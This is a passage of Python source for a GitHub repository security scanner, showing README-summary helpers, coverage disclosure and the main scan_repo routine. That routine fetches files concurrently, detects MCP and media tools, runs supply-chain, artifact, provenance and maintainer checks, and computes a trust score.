        earn the standard +5-each bonus, and
      * records a small, BOUNDED negative ``score_delta`` for clear negatives
        (archived/abandoned) — capped so it can never false-flip a small/new repo
        to F. Absent/unreadable signals contribute 0.
    """
    from src.config import settings

    if not getattr(settings, "scanner_maintainer_signals", False):
        return

    try:
        from src.scanner.maintainer import (
            analyze_maintainer_signals,
            maintainer_penalty,
        )

        sig = await analyze_maintainer_signals(
            owner, repo, token,
            max_calls=getattr(settings, "scanner_maintainer_max_calls", 5),
        )
    except Exception:
        logger.warning(
            "Maintainer-signal wiring failed for %s/%s — grade stands",
            owner, repo, exc_info=True,
        )
        return

    if not sig.ok:
        # Nothing readable (fail-open): record the attempt, no score change.
        result.maintainer = sig.summary()
        return

    # Positives → the scanner's normal positive_signals bonus (deduped as a set
    # in _calculate_trust_score). Clear negatives → a bounded score penalty.
    result.positive_signals.extend(sig.positive_signals)
    penalty = maintainer_penalty(sig)
    summary = sig.summary()
    summary["score_delta"] = -penalty
    result.maintainer = summary


# Markdown noise we skip when mining a README for a one-line "what it does":
# badge/image lines, headings, HTML, block-quotes, list bullets, rule dividers.
_README_SKIP = re.compile(
    r"^\s*(?:#{1,6}\s|>|[-*+]\s|\d+\.\s|<|!\[|\[!\[|=+\s*$|-{3,}\s*$|\|)"
)
_MD_LINK = re.compile(r"\[([^\]]+)\]\([^)]+\)")            # [text](url) -> text
_MD_INLINE = re.compile(r"[*_`]+")                          # strip * _ ` emphasis
_HTML_TAG = re.compile(r"<[^>]+>")


def _is_distinct_desc(long: str, headline: str) -> bool:
    """True when the mined second line adds information beyond the maintainer tagline —
    i.e. they're not near-duplicates (maintainer copied the README's first line into the
    GitHub 'About'). Compares on normalized alphanumerics so punctuation/case don't fool it."""
    def norm(s: str) -> str:
        return re.sub(r"[^a-z0-9]+", " ", (s or "").lower()).strip()

    a, b = norm(long), norm(headline)
    if not a or not b:
        return bool(a)
    if a == b or a.startswith(b) or b.startswith(a) or a in b or b in a:
        return False
    # Reworded near-duplicate: if the shorter line's words are almost all contained in
    # the longer one (Jaccard over the shorter), it adds nothing new.
    wa, wb = set(a.split()), set(b.split())
    short = wa if len(wa) <= len(wb) else wb
    if short and len(wa & wb) / len(short) >= 0.8:
        return False
    return True


def _clean_md_line(line: str) -> str:
    line = _MD_LINK.sub(r"\1", line)
    line = _HTML_TAG.sub("", line)
    return _MD_INLINE.sub("", line).strip()


def _readme_summary(text: str, *, long: bool = False) -> str | None:
    """Best-effort description of what a project does, mined from its README's opening
    prose. Skips the title, badges, images, and HTML preamble that open most READMEs.
    ``long=False`` returns a single first sentence (the headline "what it does" line);
    ``long=True`` returns up to ~2 sentences of the first real paragraph (the fuller
    second line shown beneath a terse maintainer tagline). None if nothing usable."""
    if not text:
        return None
    # Drop an HTML comment block or front-matter that some READMEs open with.
    body = re.sub(r"<!--.*?-->", " ", text, flags=re.S)
    lines = body.splitlines()
    for i, raw in enumerate(lines):
        line = _clean_md_line(raw.strip())
        # Skip noise (headings/badges/images/HTML/rules/lists) and non-prose leftovers.
        if not line or _README_SKIP.match(raw.strip()):
            continue
        if len(line) < 12 or not re.search(r"[A-Za-z]{3}", line):
            continue
        if line.lower().startswith(("http://", "https://", "www.")):
            continue
        # Real prose has several words — rejects a bare path/token like
        # "packages/next/README.md" that a pointer-only root README opens with.
        if len(line.split()) < 3:
            continue
        if not long:
            m = re.match(r"(.+?[.!?])(?:\s|$)", line)
            summary = (m.group(1) if m and len(m.group(1)) >= 24 else line).strip()
            return _tidy_desc(summary[:180])
        # long: gather the rest of this paragraph (until a blank line / heading), then
        # keep up to two sentences, capped so it stays a tight second line.
        para = [line]
        for nxt in lines[i + 1:]:
            s = nxt.strip()
            if not s or _README_SKIP.match(s):
                break
            para.append(_clean_md_line(s))
            if sum(len(p) for p in para) > 300:
                break
        blob = " ".join(p for p in para if p).strip()
        sents = re.findall(r".+?[.!?](?:\s|$)", blob)
        summary = ("".join(sents[:2]).strip() if sents else blob).strip()
        return _tidy_desc(summary[:240])
    return None


def _tidy_desc(s: str) -> str:
    """Trim trailing separators/dangling punctuation left by stripped markdown links
    (e.g. a leftover ' —' where '[text](url) —' was cut)."""
    return re.sub(r"[\s–—\-·|:;,]+$", "", s or "").strip()


REPO_SELECTION_RULE = (
    f"default branch; source files up to {_MAX_FILE_SIZE // 1000} KB; "
    f"first {_MAX_FILES_PER_REPO} shipped-first"
)


def files_read_digest(text_hashes: dict[str, str]) -> str | None:
    """``sha256:`` over the sorted ``path NUL sha256(text)`` lines of every file read —
    a digest of exactly what a "nothing found" claim covers (None when nothing read)."""
    if not text_hashes:
        return None
    h = hashlib.sha256()
    for path in sorted(text_hashes):
        h.update(f"{path}\0{text_hashes[path]}\n".encode())
    return "sha256:" + h.hexdigest()


def _finish_repo_coverage(
    result: ScanResult, gaps: dict, tree_sha: str | None, text_hashes: dict[str, str],
) -> None:
    """Fold the repo scan's coverage gaps + read scope into the result. Disclosure only:
    nothing here touches the score, ``sampled`` or the Certified checks."""
    dep_unread = gaps.pop("_dep_unread", None) or set()
    if dep_unread:
        gaps["dependency_files_unread"] = len(dep_unread)
    art = result.artifact_scan if isinstance(result.artifact_scan, dict) else {}
    skipped = art.get("skipped") if isinstance(art.get("skipped"), dict) else {}
    if int(skipped.get("scannable") or 0) > 0:
        gaps["package_skipped"] = int(skipped["scannable"])
    if int(skipped.get("oversized_scannable") or 0) > 0:
        gaps["oversized_files"] = (int(gaps.get("oversized_files") or 0)
                                   + int(skipped["oversized_scannable"]))
    result.coverage_gaps = {k: gaps[k] for k in sorted(gaps)}
    if not isinstance(result.coverage, dict):
        result.coverage = {}
    result.coverage["selection"] = REPO_SELECTION_RULE
    if tree_sha:
        result.coverage["tree_sha"] = tree_sha
    digest = files_read_digest(text_hashes)
    if digest:
        result.coverage["files_read_digest"] = digest


async def scan_repo(
    full_name: str,
    stars: int = 0,
    description: str = "",
    framework: str = "",
    token: str | None = None,
    artifact: tuple[str, str, str | None] | None = None,
) -> ScanResult:
    """Scan a single GitHub repo for security issues.

    Args:
        full_name: "owner/repo" format
        stars: star count (for metadata)
        description: repo description
        framework: detected framework
        token: GitHub API token (optional but recommended for rate limits)
        artifact: optional explicit published-artifact coordinate
            ``(ecosystem, name, version)`` for the Phase-2 artifact scan (npm/pypi).
            When omitted and the artifact feature flag is on, a coordinate is
            auto-discovered from the repo's root manifest.

    Returns:
        ScanResult with findings and trust score
    """
    result = ScanResult(
        repo=full_name,
        stars=stars,
        description=description,
        framework=framework,
    )

    parts = full_name.split("/")
    if len(parts) != 2:
        result.error = f"Invalid repo name: {full_name}"
        return result

    owner, repo = parts

    try:
        # Fetch file tree. A very large monorepo may come back truncated (or its
        # recursive tree fetch may error) — that's a partial/sampled tree, not a
        # failure, so we still return a real score rather than a 502.
        _repo_meta: dict = {}
        tree, tree_truncated, repo_ok, ref = await _fetch_repo_tree(
            owner, repo, token, meta_out=_repo_meta,
        )
        if not repo_ok:
            # Repo genuinely missing / private / unreachable — a real error.
            result.error = "Could not fetch repo tree (may be empty or private)"
            return result
        # Adopt the repo's own description (for the "what it does" line) + stars, unless
        # the caller already supplied them (a stored agent record wins).
        if not result.description and _repo_meta.get("description"):
            result.description = str(_repo_meta["description"]).strip()[:180]
        if not result.stars and _repo_meta.get("stars"):
            result.stars = int(_repo_meta["stars"])
        if tree_truncated:
            # The tree is only a sample of a large repo — never present the grade
            # as an authoritative whole-repo verdict.
            result.sampled = True

        result.primary_language = _detect_language(tree)

        # Declared-scope manifest (.agentavow.yml at the repo root) — the tool's own
        # declaration of intended egress + capabilities. Fail-open: a bad/absent manifest
        # is simply no declaration, never an error.
        _mpath = next(
            (it["path"] for it in tree
             if it.get("path", "").lower() in (".agentavow.yml", ".agentavow.yaml")),
            None,
        )
        if _mpath:
            try:
                from src.scanner.behavioral.manifest import parse_manifest
                _scope = parse_manifest(await _fetch_file_content(owner, repo, _mpath, token, ref))
                if _scope.present:
                    result.declared_scope = {
                        "present": True, "egress": _scope.egress,
                        "capabilities": _scope.capabilities, "note": _scope.note,
                    }
            except Exception:
                pass

        # Check for README, LICENSE, tests
        _readme_path: str | None = None
        for item in tree:
            path_lower = item["path"].lower()
            if path_lower.startswith("readme"):
                result.has_readme = True
                # Prefer a top-level README over a nested docs/ one.
                if _readme_path is None or "/" not in item["path"]:
                    _readme_path = item["path"]
            if path_lower.startswith("license") or path_lower.startswith("licence"):
                result.has_license = True
            if "test" in path_lower or "spec" in path_lower:
                result.has_tests = True

        # Enrich the score-page "what it does" line(s) from the README:
        #  • no GitHub "About" → mine the first sentence as the headline (beats
        #    "A source repository").
        #  • has an "About" → add a fuller second line ONLY when it says something the
        #    tagline doesn't (so a terse "The React Framework" gains real detail, but a
        #    maintainer who copied the README's first line into About isn't duplicated).
        if _readme_path:
            _readme_text = await _fetch_file_content(
                owner, repo, _readme_path, token, ref=ref,
            )
            if _readme_text:
                if not result.description:
                    _short = _readme_summary(_readme_text)
                    if _short:
                        result.description = _short
                else:
                    _long = _readme_summary(_readme_text, long=True)
                    if _long and _is_distinct_desc(_long, result.description):
                        result.long_description = _long

        # Detect MCP server context — MCP servers have expected tool patterns
        # (fs_access, subprocess) that shouldn't be penalized as heavily
        mcp_indicators = {"server.json", "mcp.json", ".mcp.json"}
        mcp_dep_files = {"package.json", "pyproject.toml", "setup.py"}
        for item in tree:
            fname = Path(item["path"]).name.lower()
            if fname in mcp_indicators:
                result.is_mcp_server = True
                break
        if not result.is_mcp_server:
            # Check if package.json or pyproject.toml mentions MCP
            for item in tree:
                if Path(item["path"]).name.lower() in mcp_dep_files:
                    content = await _fetch_file_content(
                        owner, repo, item["path"], token, ref=ref,
                    )
                    low = (content or "").lower()
                    mcp_match = "mcp" in low or "modelcontextprotocol" in low
                    if mcp_match or "model-context-protocol" in low:
                        result.is_mcp_server = True
                        break

        # Detect audio/TTS/media tools — filesystem access is expected
        if not result.is_media_tool:
            media_keywords = {
                "tts", "text-to-speech", "speech", "audio", "voice",
                "whisper", "synthesize", "synthesizer", "vocoder",
                "video", "ffmpeg", "media", "sound", "wav", "mp3",
                "transcribe", "transcription",
            }
            # Anti-gaming: the fs-access discount must NOT be reachable by putting
            # "audio" in the free-text DESCRIPTION (author-controlled). Require a real
            # signal — a media keyword in the repo NAME (public, costly to fake) OR
            # actual media files in the tree. Description text alone no longer qualifies.
            repo_lower = full_name.lower()
            if any(kw in repo_lower for kw in media_keywords):
                result.is_media_tool = True
            if not result.is_media_tool:
                media_file_patterns = {
                    ".wav", ".mp3", ".ogg", ".flac", ".m4a",
                    ".mp4", ".avi", ".mkv", ".webm",
                    "audio", "voice", "tts", "speech",
                }
                media_file_count = sum(
                    1 for item in tree
                    if any(p in item["path"].lower() for p in media_file_patterns)
                )
                if media_file_count >= 3:
                    result.is_media_tool = True

        # Check for dependency pinning (lock files) in tree
        lock_files = {"requirements.txt", "poetry.lock", "package-lock.json",
                      "pipfile.lock", "cargo.lock", "yarn.lock", "pnpm-lock.yaml"}
        for item in tree:
            if Path(item["path"]).name.lower() in lock_files:
                result.positive_signals.append("Dependency pinning")
                break

        # Load .agentgraph-scan.yml config if present
        user_excludes: set[str] = set()
        for item in tree:
            if item["path"] in (".agentgraph-scan.yml", ".agentgraph-scan.yaml"):
                cfg_content = await _fetch_file_content(
                    owner, repo, item["path"], token, ref=ref,
                )
                if cfg_content:
                    try:
                        import yaml  # noqa: E402
                        cfg = yaml.safe_load(cfg_content) or {}
                        for pattern in cfg.get("exclude", []):
                            user_excludes.add(str(pattern).lower())
                    except Exception:
                        pass
                break

        # Filter to scannable files (respecting user excludes). Shared with the
        # offline local scanner via _select_scan_files so selection can't drift.
        # Coverage disclosure (#4): total_scannable is the full count BEFORE the cap;
        # OR-in any already-set truncation flag (partial tree from a big monorepo).
        scan_files, result.total_scannable_files, _sel_sampled = _select_scan_files(
            tree, user_excludes,
        )
        result.sampled = result.sampled or _sel_sampled

        # Coverage gaps (disclosure only — never a score / decision input; `sampled`
        # and Certified are untouched). Oversized blobs are counted only when the scan
        # would have read them (same selection rule as the files it did read).
        gaps: dict = {}
        n_oversized = len(_oversized_scan_files(
            _repo_meta.get("oversized") or [], user_excludes, limit=0,
        ))
        if n_oversized:
            gaps["oversized_files"] = n_oversized
        if result.total_scannable_files > len(scan_files):
            gaps["over_file_cap"] = result.total_scannable_files - len(scan_files)
            gaps["file_cap"] = _MAX_FILES_PER_REPO
        if tree_truncated:
            gaps["tree_truncated"] = True

        # Load allowlist once for the whole scan
        allowlist = _load_allowlist()

        # Scan files in parallel. Fetches go through the UNMETERED raw host, so we run
        # wide (20 concurrent) with a tight per-file timeout — a huge monorepo (200-file
        # cap) must finish well inside the endpoint's overall deadline.
        import asyncio

        scan_concurrency = 20
        per_file_timeout = 8.0  # seconds per file fetch
        # Hard budget for the whole file-scan phase. If a pathologically slow repo blows
        # past it, we grade what completed and mark the result sampled — a partial signed
        # grade beats a 503 (the large-monorepo timeout Sentry was firing on).
        scan_phase_budget = 55.0
        sem = asyncio.Semaphore(scan_concurrency)

        # Phase 2: repo file content hashes (path -> sha256 of text), used to detect
        # repo↔artifact MODIFIED-file drift. Only populated for files we fetched.
        repo_text_hashes: dict[str, str] = {}
        # Every fetched text, for npm_scripts.restore_externally_invoked below.
        repo_texts: dict[str, str] = {}

        async def _scan_one(item: dict) -> tuple:
            """Fetch and scan a file.

            Returns (findings, positives, suppressed, digest, text_hash, scanned).
            ``scanned`` is True only when the file was actually fetched AND scanned —
            a failed fetch or empty file returns False so it does NOT inflate
            ``files_scanned`` (#7). ``text_hash`` is ``(path, sha256(text))`` for
            Phase-2 drift comparison, or None. A seventh element, ``failed``, is True
            when the fetch errored, timed out or returned nothing (not an empty file):
            the file was selected but never read, which the coverage gaps disclose.
            """
            path = item["path"]
            try:
                async with sem:
                    content = await asyncio.wait_for(
                        _fetch_file_content(owner, repo, path, token, ref=ref),
                        timeout=per_file_timeout,
                    )
                if not content:
                    return [], [], 0, None, None, False, content is None
                f, p, s = _scan_content(content, path, allowlist)
                repo_texts[path] = content
                text_hash = hashlib.sha256(content.encode("utf-8")).hexdigest()
                return (
                    f, p, s, (path, _canonical_tool_digest(content, path)),
                    (path, text_hash), True, False,
                )
            except (asyncio.TimeoutError, Exception):
                return [], [], 0, None, None, False, True

        tasks = [asyncio.ensure_future(_scan_one(item)) for item in scan_files]
        # Bound the phase: collect whatever finished within the budget, cancel the rest
        # and disclose the partial coverage (sampled) instead of failing the whole scan.
        # (asyncio.wait raises on an empty set, so guard the no-scannable-files case.)
        if not tasks:
            scan_results = []
        else:
            done, pending = await asyncio.wait(tasks, timeout=scan_phase_budget)
            if pending:
                for t in pending:
                    t.cancel()
                result.sampled = True
                gaps["time_limit_unread"] = len(pending)
                logger.warning(
                    "scan_repo file phase hit the %.0fs budget for %s/%s — %d/%d files (sampled)",
                    scan_phase_budget, owner, repo, len(done), len(tasks),
                )
            scan_results = [t.result() for t in tasks if t in done and not t.cancelled()]

        fetch_failed = 0
        for (findings_list, positives_list, suppressed, digest, text_hash, scanned,
             failed) in scan_results:
            # Only count files that were actually scanned (#7) — signed filesScanned
            # must reflect real coverage, not attempted fetches.
            if scanned:
                result.files_scanned += 1
            if failed:
                fetch_failed += 1
            result.findings.extend(findings_list)
            result.positive_signals.extend(positives_list)
            result.suppressed_count += suppressed
            if digest and digest[1]:
                result.tool_digests[digest[0]] = digest[1]
            if text_hash and text_hash[1]:
                repo_text_hashes[text_hash[0]] = text_hash[1]
        if fetch_failed:
            gaps["fetch_failed"] = fetch_failed
        npm_scripts.restore_externally_invoked(result.findings, repo_texts)

        # Oversized source files: scan head + tail and disclose (see _scan_oversized_text).
        oversized = _oversized_scan_files(getattr(tree, "oversized", []), user_excludes)
        if oversized:
            result.sampled = True  # the middle of each file is not read

            async def _scan_big(item: dict) -> list:
                async with sem:
                    head, tail = await asyncio.gather(
                        _fetch_file_window(owner, repo, item["path"], ref, tail=False),
                        _fetch_file_window(owner, repo, item["path"], ref, tail=True),
                    )
                return await asyncio.to_thread(
                    _scan_oversized_text, head, tail, item["path"],
                    int(item.get("size", 0)), allowlist,
                )

            big_tasks = [asyncio.ensure_future(_scan_big(it)) for it in oversized]
            done_big, pending_big = await asyncio.wait(big_tasks, timeout=20.0)
            for t in pending_big:
                t.cancel()
            for item, t in zip(oversized, big_tasks):
                if t in done_big and not t.cancelled() and t.exception() is None:
                    result.findings.extend(t.result())
                else:
                    result.findings.extend(_scan_oversized_text(
                        None, None, item["path"], int(item.get("size", 0))))

        result.tool_manifest_digest = _compute_manifest_digest(result.tool_digests)

        # --- Dependency vulnerability scanning ---
        dep_file_names = {f.lower() for f in _DEP_FILES}
        dep_files = [
            item for item in tree
            if Path(item["path"]).name.lower() in dep_file_names
            and not _should_skip_path(item["path"])
        ]
        dep_unread: set[str] = gaps.setdefault("_dep_unread", set())
        for dep_item in dep_files[:10]:  # cap at 10 dep files
            try:
                async with sem:
                    dep_content = await asyncio.wait_for(
                        _fetch_file_content(
                            owner, repo, dep_item["path"], token, ref=ref,
                        ),
                        timeout=per_file_timeout,
                    )
                if dep_content is None:
                    dep_unread.add(dep_item["path"])
                if dep_content:
                    dep_findings = _scan_dependencies(
                        dep_content, dep_item["path"],
                    )
                    result.findings.extend(dep_findings)
            except (asyncio.TimeoutError, Exception):
                dep_unread.add(dep_item["path"])

        # --- Phase 1: real supply-chain (OSV / deps.dev / Scorecard) ----------
        # Parse the repo's real lockfiles → OSV → severity-weighted CVE/GHSA/MAL
        # findings that replace the regex list for covered ecosystems. Additive,
        # feature-flagged, and FAIL-OPEN: on any error the legacy regex findings
        # above stand and the scan proceeds. Every DB date is pinned into the
        # coverage block so the subscore is offline-recomputable (Phase 0).
        await _run_supply_chain(
            result, owner, repo, tree, token, ref, sem, per_file_timeout, gaps,
        )

        # --- Phase 2: published-artifact fetch + scan + repo↔artifact drift ----
        # Feature-flagged (default OFF) and FAIL-OPEN. When enabled it scans the
        # real npm/PyPI artifact (install hooks, injected/modified files, the full
        # 12-category engine over the extracted tree) and upgrades coverage to
        # scan_depth="artifact" with the exact artifact digest.
        await _maybe_scan_artifact(
            result, owner, repo, tree, token, ref, artifact, repo_text_hashes,
        )

        # --- Phase 3: provenance / signing verification ------------------------
        # Feature-flagged (default OFF) and FAIL-OPEN. Fetches + cryptographically
        # verifies the published package's build provenance (npm Sigstore / PyPI
        # PEP 740), binds it to source repo+commit+builder, and feeds a SEPARATE
        # additive signal: verified→bonus, claims-but-fails→small penalty, absent→
        # N/A. Runs after the artifact scan so it can verify the exact fetched digest.
        await _maybe_verify_provenance(
            result, owner, repo, tree, token, ref, artifact,
        )

        # --- Published-package coordinate (surface + registry name) ------------
        # So the UI can offer package / stdio-MCP 1-click install for a repo that
        # IS a package. Prefer the canonical name from a successful artifact scan;
        # else read the root manifest directly (independent of the flag-gated,
        # sometimes-flaky artifact fetch). Fail-open — never blocks the grade.
        try:
            art = result.artifact_scan if isinstance(result.artifact_scan, dict) else {}
            if art.get("ok") and art.get("name") and art.get("ecosystem") in ("npm", "pypi"):
                result.package_coordinate = await _verified_package_coordinate(
                    owner, repo, art["ecosystem"], art["name"],
                )
            else:
                result.package_coordinate = await _resolve_repo_package(
                    owner, repo, tree, token, ref,
                )
        except Exception:  # noqa: BLE001 — fail-open
            logger.debug("package-coordinate resolve failed for %s/%s", owner, repo,
                         exc_info=True)

        # --- Context-only incident history (OSV MAL- for the mapped package) ----
        # Only when the repo maps to a published package; never scored/signed. Fail-open.
        try:
            _coord = result.package_coordinate or {}
            if _coord.get("surface") and _coord.get("name"):
                from src.scanner.incident_history import fetch_incident_history
                result.incident_history = await fetch_incident_history(
                    _coord["surface"], _coord["name"], None,
                )
        except Exception:  # noqa: BLE001 — fail-open
            pass

        # --- Phase 5: maintainer / behavioral signals --------------------------
        # Feature-flagged (default OFF) and FAIL-OPEN. GitHub-METADATA only (no
        # code execution, no sandbox): bus factor, release cadence/staleness,
        # archived/abandoned, issue responsiveness, branch protection, org 2FA,
        # signed-commit ratio. Strong positives feed positive_signals; clear
        # negatives apply a small BOUNDED penalty (never a false-F). Capped at ~5
        # extra API calls, reusing the token.
        await _maybe_maintainer_signals(result, owner, repo, token)

        # --- Coverage scope + gaps (disclosure only; never scored) -------------
        # A "nothing found" answer covers only what was read: pin WHAT was read (the
        # git tree listed, the selection rule, a digest of the exact file texts read)
        # and record what was selected but not read, so silence never reads as clean.
        _finish_repo_coverage(result, gaps, _repo_meta.get("tree_sha"), repo_text_hashes)

        # Dedupe before scoring: a repo scan grades BOTH the repo tree and the (same)
        # published artifact source, so an identical detection at the same site was
        # counted — and penalized — twice (e.g. typer's 8 completion lines → 16
        # unsafe_exec, doubling the deduction). Collapse to one per detection site.
        result.findings = _dedupe_findings(result.findings)

        # Calculate trust score and per-category sub-scores
        result.trust_score = _calculate_trust_score(result)
        result.category_scores = _calculate_category_scores(result)
        result.certified = _certified_status(result)

    except httpx.TimeoutException:
        result.error = "Request timed out"
    except Exception as exc:
        result.error = str(exc)
        logger.exception("Error scanning %s", full_name)

    return result
